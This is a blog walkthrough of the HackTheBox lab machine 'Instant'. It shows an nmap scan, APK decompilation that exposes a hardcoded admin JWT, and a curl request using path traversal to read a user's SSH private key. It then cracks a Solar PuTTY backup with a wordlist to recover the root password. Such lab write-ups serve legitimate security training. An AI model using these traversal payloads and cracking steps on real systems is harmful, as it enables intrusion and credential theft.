---
author: "pshegger"
title: "Instant - Machine Walkthrough"
date: "2025-05-06"
description: "Walkthrough for the Instant machine on HackTheBox"
tags: [ "hack the box", "HTB", "penetration testing", "walkthrough", "reverse engineering" ]
categories: [ "HTB Machine Walkthrough" ]
---

# Introduction

[Instant](https://app.hackthebox.com/machines/Instant) is a medium difficulty Linux machine on [HackTheBox](https://app.hackthebox.com/).

To compromise the machine, we need to decompile an Android application, find credentials for a Swagger page, and discover an endpoint with a [Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) vulnerability. We can use this vulnerability to get the SSH private key for a user on the machine. Once we're on the machine, we can discover a backup file for [Solar PuTTY](https://www.solarwinds.com/free-tools/solar-putty), which we can crack to recover the `root` password.

# Initial Scan

Now that we're finished with the quick summary, let's start the detailed walkthrough by scanning the target. We can run an `nmap` scan for the top 1000 ports and run the default scripts to get some information about the target.

```bash
┌──(pshegger㉿suki)-[~/Documents/htb/instant]
└─$ nmap -sC -sV -A instant.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-13 15:08 CEST
Nmap scan report for instant.htb (10.10.11.37)
Host is up (0.055s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Instant Wallet

# ...SNIP...

Nmap done: 1 IP address (1 host up) scanned in 22.38 seconds
```

Looking at the scan results, we can see that there are two open ports, `TCP/22` (`SSH`) and `TCP/80` (`HTTP`). We also learn that the target is running an (Ubuntu) Linux operating system.

# Android APK

We can continue our enumeration by visiting the webpage in our browser, and will quickly find an Android [APK](https://en.wikipedia.org/wiki/Apk_(file_format)) file that we should download to continue our investigation.

## Decompiling

`APK` files are similar to `JAR` files in the sense that both of them are simple `ZIP` files containing compiled `JVM` code and resources. We can unzip the file and see the content, but we will not find anything useful this way. To recover the content in a useful way, we need to use a few tools.

The first one is [Apktool](https://apktool.org/) which extracts the application resources into a human-readable form. It also extracts the sources into [smali](https://mobsecguys.medium.com/smali-assembler-for-dalvik-e37c8eed22f9) files, but we can do better than that using different tools.

```bash
┌──(pshegger㉿suki)-[~/Documents/htb/instant]
└─$ apktool d instant.apk
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
I: Using Apktool 2.7.0-dirty on instant.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/pshegger/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
I: Copying META-INF/services directory
```

Decompiling the source code takes more steps. First, we need to extract the `.apk` file. Then, we can use [dex2jar](https://github.com/pxb1988/dex2jar) to convert the extracted `classes.dex` file(s), into a standard `.jar` file. Once we have that, we can use any Java decompiler (e.g.: [jd-gui](https://github.com/java-decompiler/jd-gui)) to see the source code.

```bash
┌──(pshegger㉿suki)-[~/Documents/htb/instant]
└─$ unzip instant.apk -d instant_apk
# ...SNIP...

┌──(pshegger㉿suki)-[~/Documents/htb/instant]
└─$ cd instant_apk

┌──(pshegger㉿suki)-[~/Documents/htb/instant]
└─$ d2j-dex2jar.sh classes.dex
# ...SNIP...
```

## Finding Swagger

Once we have both the resources and the decompiled source code, we can move on with our enumeration. Let's start by going through the resources. Most of them are not important to us, but we can find an interesting one called `network_security_config.xml`. This file is usually used for configuring various security settings, like certificate pinning and enabling clear text traffic (see the [documentation](https://developer.android.com/privacy-and-security/security-config) for more info).

```bash
┌──(pshegger㉿suki)-[~/Documents/htb/instant]
└─$ cat instant/res/xml/network_security_config.xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">mywalletv1.instant.htb</domain>
        <domain includeSubdomains="true">swagger-ui.instant.htb</domain>
    </domain-config>
</network-security-config>
```

## Admin JWT

If we visit the Swagger page now, we will find a few endpoints, including `/api/v1/admin/read/log`. The documentation states that it can be used to read log files by specifying a file name and if it's not properly implemented, we might be able to use it for `LFI`. Unfortunately, if we try to call it, we will not be able to, since the endpoint needs authorization.

At this point, we need to go back to our decompiled application and look for something that'll grant us the required authorization. After some searching, we can find a class called `AdminActivities`, that has a method named `TestAdminAuthorization`. This method simply makes an HTTP call to a different admin endpoint, but more importantly for us, it contains a `JWT`. With the token in hand, we can try the above-mentioned endpoint to see if it's vulnerable to `LFI`.

```bash
┌──(pshegger㉿suki)-[~/Documents/htb/instant]
└─$ curl -H "Authorization:eyJhbG<SNIP>WZ6rYA" 'http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../.ssh/id_rsa' | jq .
{
  "/home/shirohige/logs/../.ssh/id_rsa": [
    "-----BEGIN RSA PRIVATE KEY-----\n",
    "MIIEogIBAAKCAQEAsMV1q8D3iRAYlNsYfcukAuGCL/ix/3BDbnSmk/IXaPCQYiRM\n",
	# ...SNIP...
    "jlMjppbHYuLUHAjkucXrWrZyUCKHApwr3/VnZDFvWQx+5qd685E=\n",
    "-----END RSA PRIVATE KEY-----\n"
  ],
  "Status": 201
}
```

# User Flag

Once we have the SSH key, we can simply log in to the target and read the flag.

```bash
┌──(pshegger㉿suki)-[~/Documents/htb/instant]
└─$ chmod 600 shirohige_id_rsa

┌──(pshegger㉿suki)-[~/Documents/htb/instant]
└─$ ssh shirohige@instant.htb -i shirohige_id_rsa
# ...SNIP...

Last login: Sun Oct 13 18:24:24 2024 from 10.10.14.130
shirohige@instant:~$ cat user.txt
<REDACTED>
```

# Solar PuTTY

Once we are on the machine, we can start looking for possible ways of privilege escalation.

Looking around the filesystem is a good starting point, and if we're observant enough, we can find a file called `sessions-backup.dat` in the folder `/opt/backups/Solar-PuTTY`.

If we're not familiar with Solar PuTTY, we can look into it with a simple Google search, and learn that it's an SSH client for Windows, and we can also find that it supports saving credentials. We can assume that the previously mentioned backup file will have something useful for us.

We can start looking for ways of extracting the backed-up data from the file, and we will soon come across [this post](https://voidsec.com/solarputtydecrypt/) by [VoidSec](https://x.com/Void_Sec). The post has some insight into how the file is encrypted, and it also contains a tool that can decrypt it if we know the password. Since we don't know the encryption password, we can try brute-forcing it, but that needs a separate tool (or modifications to this one). Luckily, someone already implemented this as a Python script, which you can find [here](https://github.com/ItsWatchMakerr/SolarPuttyCracker/blob/main/SolarPuttyCracker.py).

```bash
┌──(.venv)─(pshegger㉿suki)-[~/Documents/htb/instant/SolarPuttyCracker]
└─$ python SolarPuttyCracker.py -w /usr/share/wordlists/rockyou.txt ../sessions-backup.dat -v
# ...SNIP...
Testing password 'princesa': Incorrect
Testing password 'alexandra': Incorrect
Testing password 'alexis': Incorrect
Testing password 'jesus': Incorrect
Decryption successful using password: estrella
[+] DONE Decrypted file is saved in: SolarPutty_sessions_decrypted.txt

┌──(.venv)─(pshegger㉿suki)-[~/Documents/htb/instant/SolarPuttyCracker]
└─$ cat SolarPutty_sessions_decrypted.txt
{
    "Sessions": [
        # ...SNIP...
    ],
    "Credentials": [
        {
            "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
            "CredentialsName": "instant-root",
            "Username": "root",
            "Password": "12<REDACTED>12",
            "PrivateKeyPath": "",
            "Passphrase": "",
            "PrivateKeyContent": null
        }
    ],
    "AuthScript": [],
    "Groups": [],
    "Tunnels": [],
    "LogsFolderDestination": "C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"
}
```

# Root Flag

Since we have the `root` password, we can simply change user, and read the flag.

```bash
shirohige@instant:~$ su root
Password:
root@instant:/home/shirogen# cd
root@instant:~# cat root.txt
<REDACTED>
```